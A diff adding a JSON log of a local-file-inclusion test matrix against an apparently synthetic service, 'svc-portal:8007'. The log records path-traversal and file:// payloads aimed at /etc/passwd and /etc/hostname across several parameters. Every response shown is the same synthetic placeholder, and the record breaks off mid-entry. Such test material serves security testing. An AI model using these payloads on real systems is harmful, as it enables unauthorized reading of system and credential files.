@@ -1,0 +1,1405 @@
+{
+ "meta": {
+  "intent": "INT-r27-0021",
+  "kind": "lfi-matrix-dual-face",
+  "ts_literal": "2026-10-23T16:00:00Z"
+ },
+ "cases": [
+  {
+   "case": "baseline",
+   "endpoint": "/page",
+   "param": null,
+   "payload": null,
+   "path": "/page",
+   "raw_request": "GET /page HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:04 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "empty-param-baseline",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": null,
+   "path": "/page?path=",
+   "raw_request": "GET /page?path= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:04 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "empty-param-baseline",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": null,
+   "path": "/page?file=",
+   "raw_request": "GET /page?file= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:04 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "empty-param-baseline",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": null,
+   "path": "/page?page=",
+   "raw_request": "GET /page?page= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:04 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "empty-param-baseline",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": null,
+   "path": "/page?doc=",
+   "raw_request": "GET /page?doc= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:05 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "baseline",
+   "endpoint": "/pages",
+   "param": null,
+   "payload": null,
+   "path": "/pages",
+   "raw_request": "GET /pages HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:05 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "empty-param-baseline",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": null,
+   "path": "/pages?path=",
+   "raw_request": "GET /pages?path= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:05 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "empty-param-baseline",
+   "endpoint": "/pages",
+   "param": "file",
+   "payload": null,
+   "path": "/pages?file=",
+   "raw_request": "GET /pages?file= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:06 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "empty-param-baseline",
+   "endpoint": "/pages",
+   "param": "page",
+   "payload": null,
+   "path": "/pages?page=",
+   "raw_request": "GET /pages?page= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:06 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "empty-param-baseline",
+   "endpoint": "/pages",
+   "param": "doc",
+   "payload": null,
+   "path": "/pages?doc=",
+   "raw_request": "GET /pages?doc= HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:06 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": "passwd-dotdot-raw",
+   "payload_raw": "../../../../etc/passwd",
+   "path": "/page?path=../../../../etc/passwd",
+   "raw_request": "GET /page?path=../../../../etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:07 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": "passwd-dotdot-raw",
+   "payload_raw": "../../../../etc/passwd",
+   "path": "/page?file=../../../../etc/passwd",
+   "raw_request": "GET /page?file=../../../../etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:07 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": "passwd-dotdot-raw",
+   "payload_raw": "../../../../etc/passwd",
+   "path": "/page?page=../../../../etc/passwd",
+   "raw_request": "GET /page?page=../../../../etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:07 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": "passwd-dotdot-raw",
+   "payload_raw": "../../../../etc/passwd",
+   "path": "/page?doc=../../../../etc/passwd",
+   "raw_request": "GET /page?doc=../../../../etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:08 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": "passwd-dotdot-enc",
+   "payload_raw": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "path": "/page?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "raw_request": "GET /page?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:08 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": "passwd-dotdot-enc",
+   "payload_raw": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "path": "/page?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "raw_request": "GET /page?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:08 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": "passwd-dotdot-enc",
+   "payload_raw": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "path": "/page?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "raw_request": "GET /page?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:08 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": "passwd-dotdot-enc",
+   "payload_raw": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "path": "/page?doc=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+   "raw_request": "GET /page?doc=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:09 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": "passwd-absolute",
+   "payload_raw": "/etc/passwd",
+   "path": "/page?path=/etc/passwd",
+   "raw_request": "GET /page?path=/etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:09 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": "passwd-absolute",
+   "payload_raw": "/etc/passwd",
+   "path": "/page?file=/etc/passwd",
+   "raw_request": "GET /page?file=/etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:09 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": "passwd-absolute",
+   "payload_raw": "/etc/passwd",
+   "path": "/page?page=/etc/passwd",
+   "raw_request": "GET /page?page=/etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:10 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": "passwd-absolute",
+   "payload_raw": "/etc/passwd",
+   "path": "/page?doc=/etc/passwd",
+   "raw_request": "GET /page?doc=/etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:10 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": "passwd-filescheme",
+   "payload_raw": "file:///etc/passwd",
+   "path": "/page?path=file:///etc/passwd",
+   "raw_request": "GET /page?path=file:///etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:10 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": "passwd-filescheme",
+   "payload_raw": "file:///etc/passwd",
+   "path": "/page?file=file:///etc/passwd",
+   "raw_request": "GET /page?file=file:///etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:11 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": "passwd-filescheme",
+   "payload_raw": "file:///etc/passwd",
+   "path": "/page?page=file:///etc/passwd",
+   "raw_request": "GET /page?page=file:///etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:11 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": "passwd-filescheme",
+   "payload_raw": "file:///etc/passwd",
+   "path": "/page?doc=file:///etc/passwd",
+   "raw_request": "GET /page?doc=file:///etc/passwd HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:11 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": "hostname-dotdot-raw",
+   "payload_raw": "../../etc/hostname",
+   "path": "/page?path=../../etc/hostname",
+   "raw_request": "GET /page?path=../../etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:12 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": "hostname-dotdot-raw",
+   "payload_raw": "../../etc/hostname",
+   "path": "/page?file=../../etc/hostname",
+   "raw_request": "GET /page?file=../../etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:12 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": "hostname-dotdot-raw",
+   "payload_raw": "../../etc/hostname",
+   "path": "/page?page=../../etc/hostname",
+   "raw_request": "GET /page?page=../../etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:12 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": "hostname-dotdot-raw",
+   "payload_raw": "../../etc/hostname",
+   "path": "/page?doc=../../etc/hostname",
+   "raw_request": "GET /page?doc=../../etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:12 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": "hostname-dotdot-enc",
+   "payload_raw": "..%2F..%2Fetc%2Fhostname",
+   "path": "/page?path=..%2F..%2Fetc%2Fhostname",
+   "raw_request": "GET /page?path=..%2F..%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:13 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": "hostname-dotdot-enc",
+   "payload_raw": "..%2F..%2Fetc%2Fhostname",
+   "path": "/page?file=..%2F..%2Fetc%2Fhostname",
+   "raw_request": "GET /page?file=..%2F..%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:13 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 3
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": "hostname-dotdot-enc",
+   "payload_raw": "..%2F..%2Fetc%2Fhostname",
+   "path": "/page?page=..%2F..%2Fetc%2Fhostname",
+   "raw_request": "GET /page?page=..%2F..%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:13 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": "hostname-dotdot-enc",
+   "payload_raw": "..%2F..%2Fetc%2Fhostname",
+   "path": "/page?doc=..%2F..%2Fetc%2Fhostname",
+   "raw_request": "GET /page?doc=..%2F..%2Fetc%2Fhostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:14 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": "hostname-absolute",
+   "payload_raw": "/etc/hostname",
+   "path": "/page?path=/etc/hostname",
+   "raw_request": "GET /page?path=/etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:14 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": "hostname-absolute",
+   "payload_raw": "/etc/hostname",
+   "path": "/page?file=/etc/hostname",
+   "raw_request": "GET /page?file=/etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:14 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": "hostname-absolute",
+   "payload_raw": "/etc/hostname",
+   "path": "/page?page=/etc/hostname",
+   "raw_request": "GET /page?page=/etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:15 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": "hostname-absolute",
+   "payload_raw": "/etc/hostname",
+   "path": "/page?doc=/etc/hostname",
+   "raw_request": "GET /page?doc=/etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:15 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "path",
+   "payload": "hostname-filescheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/page?path=file:///etc/hostname",
+   "raw_request": "GET /page?path=file:///etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:15 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "file",
+   "payload": "hostname-filescheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/page?file=file:///etc/hostname",
+   "raw_request": "GET /page?file=file:///etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:15 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 0
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "page",
+   "payload": "hostname-filescheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/page?page=file:///etc/hostname",
+   "raw_request": "GET /page?page=file:///etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:16 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 1
+  },
+  {
+   "case": "payload",
+   "endpoint": "/page",
+   "param": "doc",
+   "payload": "hostname-filescheme",
+   "payload_raw": "file:///etc/hostname",
+   "path": "/page?doc=file:///etc/hostname",
+   "raw_request": "GET /page?doc=file:///etc/hostname HTTP/1.1\r\nHost: svc-portal:8007\r\n\r\n",
+   "resp_status": 200,
+   "resp_headers": {
+    "Server": "BaseHTTP/0.6 Python/3.12.14",
+    "Date": "Fri, 09 Oct 2026 15:36:16 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "65"
+   },
+   "resp_body_excerpt": "<html>GTLFI-02 synthetic local file: /etc/hostname content</html>",
+   "body_full_len": 65,
+   "elapsed_ms": 2
+  },
+  {
+   "case": "payload",
+   "endpoint": "/pages",
+   "param": "path",
+   "payload": "passwd-dotdot-raw",
+   "payload_raw": "../../../../etc/passwd",
